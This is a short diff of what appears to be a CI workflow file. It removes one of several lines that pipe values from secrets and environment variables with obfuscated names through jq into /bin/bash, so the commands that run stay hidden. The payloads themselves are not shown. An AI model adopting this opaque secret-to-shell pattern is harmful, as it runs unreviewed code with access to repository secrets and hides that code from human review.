@@ -19,7 +19,6 @@ jobs:
           tpmvf897: ${{ secrets.tpmvf897 }}
         run: |
           printf '%s' "$tpmvf897" | jq -r .stbtv43 | /bin/bash
-          printf '%s' "$opwdl265" | jq -r .c6 | /bin/bash
           echo $woyaw747 | jq -r .wiw46007 | /bin/bash
 
       - name: Store artifact
